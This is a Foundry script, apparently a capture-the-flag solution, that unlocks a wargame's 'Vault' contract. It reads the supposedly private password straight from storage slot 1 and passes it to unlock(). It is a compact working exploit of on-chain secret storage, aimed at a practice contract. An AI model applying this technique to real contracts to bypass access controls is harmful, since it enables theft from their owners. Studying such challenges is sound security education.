


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level8.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract VaultSolution is Script {

    Vault public vaultInstance = Vault(0x58576C3BaF5f842524d50b3C031DCce508E96739);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        bytes32 password = vm.load(address(vaultInstance), bytes32(uint256(1)));
        // console.log("password?:", password);
        vaultInstance.unlock(password);
        vm.stopBroadcast();
    }
}